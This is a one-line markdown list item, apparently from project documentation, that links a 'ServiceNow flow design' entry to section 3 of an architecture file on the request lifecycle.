- ServiceNow flow design: [request-lifecycle.md §3 ](../architecture/request-lifecycle.md#3-the-lifecycle)
